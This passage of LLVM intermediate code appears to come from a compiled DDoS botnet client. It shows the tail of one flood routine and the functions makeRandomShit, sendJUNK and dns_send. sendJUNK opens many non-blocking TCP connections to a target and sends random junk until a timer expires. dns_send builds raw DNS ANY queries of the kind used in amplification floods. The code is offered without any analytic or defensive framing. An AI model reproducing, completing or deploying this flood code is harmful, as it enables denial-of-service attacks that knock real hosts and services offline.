  %171 = load i32, i32* %15, align 4
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %173, label %184

173:                                              ; preds = %163
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = call i32 @close(i32 noundef %178)
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 0, i8* %183, align 4
  br label %189

184:                                              ; preds = %163
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 2, i8* %188, align 4
  br label %189

189:                                              ; preds = %184, %173
  br label %205

190:                                              ; preds = %132
  %191 = load i32, i32* %16, align 4
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %204

193:                                              ; preds = %190
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %195
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %196, i32 0, i32 0
  %198 = load i32, i32* %197, align 8
  %199 = call i32 @close(i32 noundef %198)
  %200 = load i32, i32* %8, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %201
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %202, i32 0, i32 1
  store i8 0, i8* %203, align 4
  br label %204

204:                                              ; preds = %193, %190
  br label %205

205:                                              ; preds = %204, %189
  br label %266

206:                                              ; preds = %61
  br label %207

207:                                              ; preds = %206
  store %struct.__sigset_t* %12, %struct.__sigset_t** %22, align 8
  store i32 0, i32* %21, align 4
  br label %208

208:                                              ; preds = %218, %207
  %209 = load i32, i32* %21, align 4
  %210 = zext i32 %209 to i64
  %211 = icmp ult i64 %210, 16
  br i1 %211, label %212, label %221

212:                                              ; preds = %208
  %213 = load %struct.__sigset_t*, %struct.__sigset_t** %22, align 8
  %214 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %213, i32 0, i32 0
  %215 = load i32, i32* %21, align 4
  %216 = zext i32 %215 to i64
  %217 = getelementptr inbounds [16 x i64], [16 x i64]* %214, i64 0, i64 %216
  store i64 0, i64* %217, align 8
  br label %218

218:                                              ; preds = %212
  %219 = load i32, i32* %21, align 4
  %220 = add i32 %219, 1
  store i32 %220, i32* %21, align 4
  br label %208, !llvm.loop !53

221:                                              ; preds = %208
  br label %222

222:                                              ; preds = %221
  br label %223

223:                                              ; preds = %222
  %224 = load i32, i32* %8, align 4
  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %225
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 8
  %229 = srem i32 %228, 64
  %230 = zext i32 %229 to i64
  %231 = shl i64 1, %230
  %232 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %234
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %235, i32 0, i32 0
  %237 = load i32, i32* %236, align 8
  %238 = sdiv i32 %237, 64
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds [16 x i64], [16 x i64]* %232, i64 0, i64 %239
  %241 = load i64, i64* %240, align 8
  %242 = or i64 %241, %231
  store i64 %242, i64* %240, align 8
  %243 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %243, align 8
  %244 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %244, align 8
  %245 = load i32, i32* %8, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %246
  %248 = getelementptr inbounds %struct.state_t, %struct.state_t* %247, i32 0, i32 0
  %249 = load i32, i32* %248, align 8
  %250 = add nsw i32 %249, 1
  %251 = call i32 @select(i32 noundef %250, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %12, %struct.timeval* noundef %13)
  store i32 %251, i32* %16, align 4
  %252 = load i32, i32* %16, align 4
  %253 = icmp ne i32 %252, 0
  br i1 %253, label %254, label %265

254:                                              ; preds = %223
  %255 = load i32, i32* %8, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %256
  %258 = getelementptr inbounds %struct.state_t, %struct.state_t* %257, i32 0, i32 0
  %259 = load i32, i32* %258, align 8
  %260 = call i32 @close(i32 noundef %259)
  %261 = load i32, i32* %8, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %262
  %264 = getelementptr inbounds %struct.state_t, %struct.state_t* %263, i32 0, i32 1
  store i8 0, i8* %264, align 4
  br label %265

265:                                              ; preds = %254, %223
  br label %266

266:                                              ; preds = %265, %205, %114, %61
  br label %267

267:                                              ; preds = %266
  %268 = load i32, i32* %8, align 4
  %269 = add nsw i32 %268, 1
  store i32 %269, i32* %8, align 4
  br label %57, !llvm.loop !54

270:                                              ; preds = %57
  br label %51, !llvm.loop !55

271:                                              ; preds = %51
  %272 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %272)
  br label %273

273:                                              ; preds = %271, %34
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @realrand(i32 noundef %0, i32 noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %5 = call i64 @time(i64* noundef null) #12
  %6 = call i32 @getpid() #12
  %7 = sext i32 %6 to i64
  %8 = add nsw i64 %5, %7
  %9 = trunc i64 %8 to i32
  call void @srand(i32 noundef %9) #12
  %10 = call i32 @rand() #12
  %11 = load i32, i32* %4, align 4
  %12 = add nsw i32 %11, 1
  %13 = load i32, i32* %3, align 4
  %14 = sub nsw i32 %12, %13
  %15 = srem i32 %10, %14
  %16 = load i32, i32* %3, align 4
  %17 = add nsw i32 %15, %16
  ret i32 %17
}

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeRandomShit(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* noundef null) #12
  %7 = trunc i64 %6 to i32
  call void @srand(i32 noundef %7) #12
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %8

8:                                                ; preds = %21, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %24

12:                                               ; preds = %8
  %13 = call i32 @rand() #12
  %14 = srem i32 %13, 255
  %15 = add nsw i32 %14, 1
  %16 = trunc i32 %15 to i8
  %17 = load i8*, i8** %3, align 8
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  store i8 %16, i8* %20, align 1
  br label %21

21:                                               ; preds = %12
  %22 = load i32, i32* %5, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %5, align 4
  br label %8, !llvm.loop !56

24:                                               ; preds = %8
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendJUNK(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.__sigset_t*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %23 = call i32 @getdtablesize() #12
  %24 = sdiv i32 %23, 2
  store i32 %24, i32* %7, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %5, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 noundef zeroext %27) #15
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = call i32 @getHost(i8* noundef %30, %struct.in_addr* noundef %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %3
  br label %245

35:                                               ; preds = %3
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %37, i8 0, i64 8, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store i64 %39, i64* %11, align 8
  %42 = bitcast %struct.state_t* %41 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 %45, i1 false)
  %46 = call noalias i8* @malloc(i64 noundef 1024) #12
  store i8* %46, i8** %17, align 8
  %47 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %47, i8 0, i64 1024, i1 false)
  store i32 1024, i32* %18, align 4
  %48 = call i64 @time(i64* noundef null) #12
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = add nsw i64 %48, %50
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %19, align 4
  br label %53

53:                                               ; preds = %242, %35
  %54 = load i32, i32* %19, align 4
  %55 = sext i32 %54 to i64
  %56 = call i64 @time(i64* noundef null) #12
  %57 = icmp sgt i64 %55, %56
  br i1 %57, label %58, label %243

58:                                               ; preds = %53
  store i32 0, i32* %8, align 4
  br label %59

59:                                               ; preds = %239, %58
  %60 = load i32, i32* %8, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp slt i32 %60, %61
  br i1 %62, label %63, label %242

63:                                               ; preds = %59
  %64 = load i32, i32* %8, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %65
  %67 = getelementptr inbounds %struct.state_t, %struct.state_t* %66, i32 0, i32 1
  %68 = load i8, i8* %67, align 4
  %69 = zext i8 %68 to i32
  switch i32 %69, label %238 [
    i32 0, label %70
    i32 1, label %117
    i32 2, label %208
  ]

70:                                               ; preds = %63
  %71 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %73
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %74, i32 0, i32 0
  store i32 %71, i32* %75, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %77
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %82
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %83, i32 0, i32 0
  %85 = load i32, i32* %84, align 8
  %86 = call i32 (i32, i32, ...) @fcntl(i32 noundef %85, i32 noundef 3, i8* noundef null)
  %87 = or i32 %86, 2048
  %88 = call i32 (i32, i32, ...) @fcntl(i32 noundef %80, i32 noundef 4, i32 noundef %87)
  %89 = load i32, i32* %8, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %90
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %91, i32 0, i32 0
  %93 = load i32, i32* %92, align 8
  %94 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %95, %struct.sockaddr** %94, align 8
  %96 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %97 = load %struct.sockaddr*, %struct.sockaddr** %96, align 8
  %98 = call i32 @connect(i32 noundef %93, %struct.sockaddr* %97, i32 noundef 16)
  %99 = icmp ne i32 %98, -1
  br i1 %99, label %104, label %100

100:                                              ; preds = %70
  %101 = call i32* @__errno_location() #15
  %102 = load i32, i32* %101, align 4
  %103 = icmp ne i32 %102, 115
  br i1 %103, label %104, label %111

104:                                              ; preds = %100, %70
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = call i32 @close(i32 noundef %109)
  br label %116

111:                                              ; preds = %100
  %112 = load i32, i32* %8, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %113
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %114, i32 0, i32 1
  store i8 1, i8* %115, align 4
  br label %116

116:                                              ; preds = %111, %104
  br label %238

117:                                              ; preds = %63
  br label %118

118:                                              ; preds = %117
  store %struct.__sigset_t* %12, %struct.__sigset_t** %22, align 8
  store i32 0, i32* %21, align 4
  br label %119

119:                                              ; preds = %129, %118
  %120 = load i32, i32* %21, align 4
  %121 = zext i32 %120 to i64
  %122 = icmp ult i64 %121, 16
  br i1 %122, label %123, label %132

123:                                              ; preds = %119
  %124 = load %struct.__sigset_t*, %struct.__sigset_t** %22, align 8
  %125 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %124, i32 0, i32 0
  %126 = load i32, i32* %21, align 4
  %127 = zext i32 %126 to i64
  %128 = getelementptr inbounds [16 x i64], [16 x i64]* %125, i64 0, i64 %127
  store i64 0, i64* %128, align 8
  br label %129

129:                                              ; preds = %123
  %130 = load i32, i32* %21, align 4
  %131 = add i32 %130, 1
  store i32 %131, i32* %21, align 4
  br label %119, !llvm.loop !57

132:                                              ; preds = %119
  br label %133

133:                                              ; preds = %132
  br label %134

134:                                              ; preds = %133
  %135 = load i32, i32* %8, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %136
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %137, i32 0, i32 0
  %139 = load i32, i32* %138, align 8
  %140 = srem i32 %139, 64
  %141 = zext i32 %140 to i64
  %142 = shl i64 1, %141
  %143 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %144 = load i32, i32* %8, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %145
  %147 = getelementptr inbounds %struct.state_t, %struct.state_t* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 8
  %149 = sdiv i32 %148, 64
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [16 x i64], [16 x i64]* %143, i64 0, i64 %150
  %152 = load i64, i64* %151, align 8
  %153 = or i64 %152, %142
  store i64 %153, i64* %151, align 8
  %154 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %154, align 8
  %155 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %155, align 8
  %156 = load i32, i32* %8, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %157
  %159 = getelementptr inbounds %struct.state_t, %struct.state_t* %158, i32 0, i32 0
  %160 = load i32, i32* %159, align 8
  %161 = add nsw i32 %160, 1
  %162 = call i32 @select(i32 noundef %161, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %12, %struct.__sigset_t* noundef null, %struct.timeval* noundef %13)
  store i32 %162, i32* %16, align 4
  %163 = load i32, i32* %16, align 4
  %164 = icmp eq i32 %163, 1
  br i1 %164, label %165, label %192

165:                                              ; preds = %134
  store i32 4, i32* %14, align 4
  %166 = load i32, i32* %8, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %167
  %169 = getelementptr inbounds %struct.state_t, %struct.state_t* %168, i32 0, i32 0
  %170 = load i32, i32* %169, align 8
  %171 = bitcast i32* %15 to i8*
  %172 = call i32 @getsockopt(i32 noundef %170, i32 noundef 1, i32 noundef 4, i8* noundef %171, i32* noundef %14) #12
  %173 = load i32, i32* %15, align 4
  %174 = icmp ne i32 %173, 0
  br i1 %174, label %175, label %186

175:                                              ; preds = %165
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %177
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %178, i32 0, i32 0
  %180 = load i32, i32* %179, align 8
  %181 = call i32 @close(i32 noundef %180)
  %182 = load i32, i32* %8, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %183
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %184, i32 0, i32 1
  store i8 0, i8* %185, align 4
  br label %191

186:                                              ; preds = %165
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 1
  store i8 2, i8* %190, align 4
  br label %191

191:                                              ; preds = %186, %175
  br label %207

192:                                              ; preds = %134
  %193 = load i32, i32* %16, align 4
  %194 = icmp eq i32 %193, -1
  br i1 %194, label %195, label %206

195:                                              ; preds = %192
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 0
  %200 = load i32, i32* %199, align 8
  %201 = call i32 @close(i32 noundef %200)
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %203
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %204, i32 0, i32 1
  store i8 0, i8* %205, align 4
  br label %206

206:                                              ; preds = %195, %192
  br label %207

207:                                              ; preds = %206, %191
  br label %238

208:                                              ; preds = %63
  %209 = call i32 @realrand(i32 noundef 32, i32 noundef 1024)
  store i32 %209, i32* %18, align 4
  %210 = load i8*, i8** %17, align 8
  %211 = load i32, i32* %18, align 4
  call void @makeRandomShit(i8* noundef %210, i32 noundef %211)
  %212 = load i32, i32* %8, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %213
  %215 = getelementptr inbounds %struct.state_t, %struct.state_t* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 8
  %217 = load i8*, i8** %17, align 8
  %218 = load i32, i32* %18, align 4
  %219 = sext i32 %218 to i64
  %220 = call i64 @send(i32 noundef %216, i8* noundef %217, i64 noundef %219, i32 noundef 16384)
  %221 = icmp eq i64 %220, -1
  br i1 %221, label %222, label %237

222:                                              ; preds = %208
  %223 = call i32* @__errno_location() #15
  %224 = load i32, i32* %223, align 4
  %225 = icmp ne i32 %224, 11
  br i1 %225, label %226, label %237

226:                                              ; preds = %222
  %227 = load i32, i32* %8, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %228
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 8
  %232 = call i32 @close(i32 noundef %231)
  %233 = load i32, i32* %8, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %234
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %235, i32 0, i32 1
  store i8 0, i8* %236, align 4
  br label %237

237:                                              ; preds = %226, %222, %208
  br label %238

238:                                              ; preds = %237, %207, %116, %63
  br label %239

239:                                              ; preds = %238
  %240 = load i32, i32* %8, align 4
  %241 = add nsw i32 %240, 1
  store i32 %241, i32* %8, align 4
  br label %59, !llvm.loop !58

242:                                              ; preds = %59
  br label %53, !llvm.loop !59

243:                                              ; preds = %53
  %244 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %244)
  br label %245

245:                                              ; preds = %243, %34
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @dns_format(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  store i32 0, i32* %5, align 4
  %7 = load i8*, i8** %4, align 8
  %8 = call i8* @strcat(i8* noundef %7, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i64 0, i64 0)) #12
  store i32 0, i32* %6, align 4
  br label %9

9:                                                ; preds = %49, %2
  %10 = load i32, i32* %6, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %4, align 8
  %13 = call i64 @strlen(i8* noundef %12) #11
  %14 = icmp ult i64 %11, %13
  br i1 %14, label %15, label %52

15:                                               ; preds = %9
  %16 = load i8*, i8** %4, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 46
  br i1 %22, label %23, label %48

23:                                               ; preds = %15
  %24 = load i32, i32* %6, align 4
  %25 = load i32, i32* %5, align 4
  %26 = sub nsw i32 %24, %25
  %27 = trunc i32 %26 to i8
  %28 = load i8*, i8** %3, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %3, align 8
  store i8 %27, i8* %28, align 1
  br label %30

30:                                               ; preds = %42, %23
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %6, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %45

34:                                               ; preds = %30
  %35 = load i8*, i8** %4, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %3, align 8
  store i8 %39, i8* %40, align 1
  br label %42

42:                                               ; preds = %34
  %43 = load i32, i32* %5, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  br label %30, !llvm.loop !60

45:                                               ; preds = %30
  %46 = load i32, i32* %5, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %5, align 4
  br label %48

48:                                               ; preds = %45, %15
  br label %49

49:                                               ; preds = %48
  %50 = load i32, i32* %6, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %6, align 4
  br label %9, !llvm.loop !61

52:                                               ; preds = %9
  %53 = load i8*, i8** %3, align 8
  %54 = getelementptr inbounds i8, i8* %53, i32 1
  store i8* %54, i8** %3, align 8
  store i8 0, i8* %53, align 1
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @dns_hdr_create(%struct.dns_hdr* noundef %0) #0 {
  %2 = alloca %struct.dns_hdr*, align 8
  store %struct.dns_hdr* %0, %struct.dns_hdr** %2, align 8
  %3 = call i32 @getpid() #12
  %4 = trunc i32 %3 to i16
  %5 = call zeroext i16 @htons(i16 noundef zeroext %4) #15
  %6 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %7 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %6, i32 0, i32 0
  store i16 %5, i16* %7, align 2
  %8 = call zeroext i16 @htons(i16 noundef zeroext 256) #15
  %9 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %10 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %9, i32 0, i32 1
  store i16 %8, i16* %10, align 2
  %11 = call zeroext i16 @htons(i16 noundef zeroext 1) #15
  %12 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %13 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %12, i32 0, i32 2
  store i16 %11, i16* %13, align 2
  %14 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %15 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %14, i32 0, i32 3
  store i16 0, i16* %15, align 2
  %16 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %17 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %16, i32 0, i32 4
  store i16 0, i16* %17, align 2
  %18 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %19 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %18, i32 0, i32 5
  store i16 0, i16* %19, align 2
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @dns_send(i8* noundef %0, i32 noundef %1, i8* noundef %2, i8* noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca %struct.dns_hdr*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca [32 x i8], align 16
  %13 = alloca %struct.query*, align 8
  %14 = alloca [4096 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca %struct.ps_hdr, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %24 = bitcast [128 x i8]* %9 to %struct.dns_hdr*
  store %struct.dns_hdr* %24, %struct.dns_hdr** %10, align 8
  %25 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  call void @dns_hdr_create(%struct.dns_hdr* noundef %25)
  %26 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 12
  store i8* %26, i8** %11, align 8
  %27 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  %28 = load i8*, i8** %8, align 8
  %29 = call i8* @strcpy(i8* noundef %27, i8* noundef %28) #12
  %30 = load i8*, i8** %11, align 8
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i64 0, i64 0
  call void @dns_format(i8* noundef %30, i8* noundef %31)
  %32 = load i8*, i8** %11, align 8
  %33 = call i64 @strlen(i8* noundef %32) #11
  %34 = add i64 %33, 1
  %35 = add i64 12, %34
  %36 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 %35
  %37 = bitcast i8* %36 to %struct.query*
  store %struct.query* %37, %struct.query** %13, align 8
  %38 = call zeroext i16 @htons(i16 noundef zeroext 255) #15
  %39 = load %struct.query*, %struct.query** %13, align 8
  %40 = getelementptr inbounds %struct.query, %struct.query* %39, i32 0, i32 0
  store i16 %38, i16* %40, align 2
  %41 = call zeroext i16 @htons(i16 noundef zeroext 1) #15
  %42 = load %struct.query*, %struct.query** %13, align 8
  %43 = getelementptr inbounds %struct.query, %struct.query* %42, i32 0, i32 1
  store i16 %41, i16* %43, align 2
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %44, i8 0, i64 4096, i1 false)
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i64 0, i64 0
  %46 = getelementptr inbounds i8, i8* %45, i64 20
